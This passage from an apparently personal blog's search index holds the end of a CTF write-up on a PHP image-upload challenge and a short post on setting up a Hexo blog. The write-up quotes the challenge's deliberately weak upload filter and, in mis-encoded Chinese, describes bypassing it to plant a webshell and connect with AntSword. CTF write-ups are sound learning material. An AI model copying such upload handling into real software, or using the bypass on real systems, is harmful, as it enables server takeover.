class="variable">$img_info</span>[<span class="number">1</span>]&lt;=<span class="number">20</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>()))&#123;</span><br><span class="line">                        <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$save_path</span> = <span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>().<span class="string">&quot;/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">                    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$save_path</span>);</span><br><span class="line">                    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$save_path</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$content</span>))&#123;</span><br><span class="line">                        <span class="title function_ invoke__">sleep</span>(<span class="number">5</span>);</span><br><span class="line">                        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$save_path</span>);</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;hacker!!!&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;upload success!! upload/your_sessionid/your_filename&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;image hight and width must less than 20&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;invalid file head&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;invalid file type!image/jpeg only!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;welcome.jpg&quot;</span>)).<span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>‰º†‰∏ÄÂº†ÂõæÁâáÈ©¨ÊòæÁ§∫Â§™Â§ß‰∫Ü<br><img src="https://s1.ax1x.com/2022/11/08/xzKqf0.png" alt="xzKqf0.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$img_info</span>[<span class="number">0</span>]&lt;=<span class="number">20</span> &amp;&amp; <span class="variable">$img_info</span>[<span class="number">1</span>]&lt;=<span class="number">20</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>()))&#123;</span><br><span class="line">                        <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>());</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure><p>Áõ¥Êé•‰ΩøÁî®defineÊîπÔºåÁ¨¨‰∏ÄÊ¨°ÈÅáÂà∞Ëøô‰∏≠Êìç‰ΩúÔºåÈ¢òÂà∑ÁöÑÂ§™Â∞ë‰∫Ü<br><img src="https://s1.ax1x.com/2022/11/08/xzKowj.png" alt="xzKowj.png"><br>Ë¢´Êã¶‰∫ÜÔºåËÄå‰∏îÊúâÂª∂Êó∂</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$content</span>))&#123;</span><br><span class="line">                       <span class="title function_ invoke__">sleep</span>(<span class="number">5</span>);</span><br><span class="line">                       @<span class="title function_ invoke__">unlink</span>(<span class="variable">$save_path</span>);</span><br><span class="line">                       <span class="keyword">die</span>(<span class="string">&quot;hacker!!!&quot;</span>);</span><br></pre></td></tr></table></figure><p>ËØï‰∏Ä‰∏ãÁü≠Ê†áÁ≠æ<br><img src="https://s1.ax1x.com/2022/11/08/xzKImQ.png" alt="xzKImQ.png"><br>‰∏ä‰º†ÊàêÂäüÔºåPHPËØï‰∏Ä‰∏ã<br><img src="https://s1.ax1x.com/2022/11/08/xzK4Og.png" alt="xzK4Og.png"><br>ÊàêÂäüÔºåË∑ØÂæÑÁõ¥Êé•ÊèêÁ§∫‰∫ÜÊ†ºÂºèÔºåËøûËöÅÂâë<br><img src="https://s1.ax1x.com/2022/11/08/xzKh6S.png" alt="xzKh6S.png"><br>‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πàËøû‰∏ç‰∏äÔºåËøõÂÖ•Êñá‰ª∂ÂèëÁé∞Êä•Èîô<br><a href="https://imgse.com/i/xzKfl8"><img src="https://s1.ax1x.com/2022/11/08/xzKfl8.png" alt="xzKfl8.png"></a><br>Â§ö‰∫Ü‰∏Ä‰∏™<code>&gt;</code>Âà†ÊéâËøûÊé•ÊàêÂäüÔºåÊñá‰ª∂Êâì‰∏çÂºÄÁõ¥Êé•ËøõÁªàÁ´Ø<br><img src="https://s1.ax1x.com/2022/11/08/xzKTTs.png" alt="xzKTTs.png"></p><h1 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h1><p>ÂèÇËÄÉÔºö</p><p>(<a href="https://www.wd-ljt.com/post/1024/894.html">https://www.wd-ljt.com/post/1024/894.html</a>)       </p><p>ËøôÁØáÂ§çÁé∞È∏Ω‰∫ÜËøô‰πà‰πÖÁªà‰∫éÂºÑÂÆå‰∫ÜÔºåËøôÁØáÂçöÂÆ¢ÂõæÁâá‰∏ä‰º†ÁöÑÁúü‰∏çÂÆπÊòìÂïäÔºåobsidainÂØπÂõæÁâáÁöÑÂ§ÑÁêÜÁúüÁöÑÈ∫ªÁÉ¶ÔºåÂæóÊâæ‰∏™Êèí‰ª∂Ëß£ÂÜ≥‰∏Ä‰∏ãËøô‰∏™ÈóÆÈ¢òÔºå‰∏çÁÑ∂‰∏ãÊ¨°ËøòÂæó‰∏Ä‰∏™‰∏™ÈáçÊñ∞Êà™Âõæ‰øùÂ≠ò‰∏ä‰º†ÔºåÂçöÂÆ¢Ëøò‰∏çÂ§üÂÆåÂñÑÔºåÂØºËà™ÈÉΩËøòÊ≤°ÂºÑÔºåÊâæ‰∏™Êó∂Èó¥ÂºÑÂºÑÂêß</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ÂçöÂÆ¢Êê≠Âª∫</title>
      <link href="/2022/10/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2022/10/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h3>hexo+GitHubÊê≠Âª∫</h3><p>Âü∫Êú¨Ê≠•È™§Áõ¥Êé•ÁúãËßÜÈ¢ë<a href="https://www.bilibili.com/video/BV1mU4y1j72n?p=5&spm_id_from=pageDriver&vd_source=fdbccecc8d1a39a2449860e47c52b6e7">Âú∞ÂùÄ</a></p><p>Âª∫ËÆÆÊîæÂçöÂÆ¢ÁöÑÊñá‰ª∂Â§π‰∏çË¶ÅÊîæ‰∏≠ÊñáÔºåÊàëÂú®ÊâßË°å<code>hexo init</code>Êó∂‰∏ÄÁõ¥Êä•ÈîôÔºå‰ΩÜÊòØÊää‰∏≠ÊñáÂêçÂéªÊéâ‰πãÂêéÂ∞±Â•Ω‰∫Ü</p><h3>‰∏ªÈ¢òËÆæÁΩÆ</h3>ÊâìÂºÄ‰Ω†ÂàõÂª∫ÁöÑÊîæÂçöÂÆ¢ÂÜÖÂÆπÁöÑÊñá‰ª∂Â§π<p><img src="https://s1.ax1x.com/2022/10/05/xl26rF.md.png" alt="xl26rF.md.png"></p><p>ÊâìÂºÄ_config.ymlÊñá‰ª∂ÔºåÊàëËøôÈáåÁî®vscodeÊâìÂºÄÁöÑ</p><p><img src="https://s1.ax1x.com/2022/10/05/xlRZR0.png" alt="xlRZR0.png"></p><p>Â∞ÜthemeÂêéÈù¢ÁöÑ‰∏úË•øÊîπ‰∏∫‰Ω†ÁöÑ‰∏ªÈ¢òÂêçÔºå‰Ω†‰∏ãËΩΩÂ•ΩÁöÑ‰∏ªÈ¢òÂêçÂú®themes‰∏≠ËÉΩÁúãÂà∞ÔºåËá≥‰∫éÊÄé‰πà‰∏ãËΩΩÂèØ‰ª•Âú®[ÂÆòÁΩë](<a href="https://hexo.io/themes/">Themes | Hexo</a>)ÈÄâ‰∏Ä‰∏™ÂñúÊ¨¢ÁöÑ‰ΩøÁî®ÂëΩ‰ª§‰∏ãËΩΩÔºå‰πüÂèØ‰ª•Áõ¥Êé•Âú®GitHubÂ∞ÜÊñá‰ª∂‰∏ãËΩΩÁÑ∂ÂêéËß£ÂéãÂà∞themesÊñá‰ª∂Èáå</p><p><strong>ÊâßË°åhexo‰∏âËøû</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo cl //Ê∏ÖÈô§ÁºìÂ≠ò</span><br><span class="line">hexo g  //ÁîüÊàêÈùôÊÄÅÊñá‰ª∂Ôºå‰∏™‰∫∫ÁêÜËß£Â∞ÜmdËΩ¨‰∏∫html</span><br><span class="line">hexo s  //Êú¨Âú∞È¢ÑËßà</span><br></pre></td></tr></table></figure><p>Êª°ÊÑè‰πãÂêé‰∏äÁ∫ø</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><h3 id="‰∏ªÈ¢òÁöÑ‰∏™ÊÄßÂåñ"><a href="#‰∏ªÈ¢òÁöÑ‰∏™ÊÄßÂåñ" class="headerlink" title="‰∏ªÈ¢òÁöÑ‰∏™ÊÄßÂåñ"></a>‰∏ªÈ¢òÁöÑ‰∏™ÊÄßÂåñ</h3><p>Ëøô‰∏ÄÊ≠•ÊàëÊÉ≥Êç¢ÊàëËá™Â∑±ÂñúÊ¨¢ÁöÑÂõæÁâáÔºåÊ®™ÂπÖËÉåÊôØÔºåÂØºËà™Ê†èlogoÔºå‰ΩÜÊòØ‰∏ÄÁõ¥Â§±Ë¥•ÊåâÁÖßÂÆòÊñπÊñáÊ°£ÈÖçÁΩÆ‰πü‰∏çË°åÔºåÂè™ËÉΩÁî®ÈªòËÆ§ÔºåÁ≠â‰ª•ÂêéÁ†îÁ©∂ÊòéÁôΩ‰∫ÜÂÜçÂºÑ„ÄÇ</p><h3 id="ÂõæÂ∫äÁöÑ‰ΩøÁî®"><a href="#ÂõæÂ∫äÁöÑ‰ΩøÁî®" class="headerlink" title="ÂõæÂ∫äÁöÑ‰ΩøÁî®"></a>ÂõæÂ∫äÁöÑ‰ΩøÁî®</h3><p>ÊàëÁî®ÁöÑÊòØ[Ë∑ØËøáÂõæÂ∫ä](<a href="https://imgse.com/">Ë∑ØËøáÂõæÂ∫ä - ÂÖçË¥πÂõæÁâá‰∏ä‰º†, ‰∏ì‰∏öÂõæÁâáÂ§ñÈìæ, ÂÖçË¥πÂÖ¨ÂÖ±ÂõæÂ∫ä (imgse.com)</a>)ÁúãÁΩë‰∏äÁöÑÊïôÁ®ã‰ΩøÁî®Êèí‰ª∂Ê≤°ÊàêÂäüÔºåPicgoË£ÖÂ•Ω‰∫ÜÂêØÂä®‰∏ç‰∫ÜÂ∞±ÂæàÊáµ</p><p>‰ΩøÁî®ÔºöÁõ¥Êé•ÊääÂõæÁâá‰∏ä‰º†Âà∞ÂõæÂ∫ä‰∏äÈù¢ÔºåÁÑ∂ÂêéÂ§çÂà∂‰∏ãÈù¢ËøôÈáåÁöÑËøûÊé•Â∞±Ë°å</p><p><img src="https://s1.ax1x.com/2022/10/05/xlWxu8.png" alt="xlWxu8.png"></p><p>ÊÄªÁªì</p><p>ÂæàÂ§öÁªÜËäÇËøòÊòØÊúâÈóÆÈ¢òÔºåÂèØËÉΩÊòØÊàë‰ΩøÁî®ÁöÑ‰∏ªÈ¢òÊúâÈóÆÈ¢ò‰ª•ÂêéÊÖ¢ÊÖ¢ÂÜçÂºÑ</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
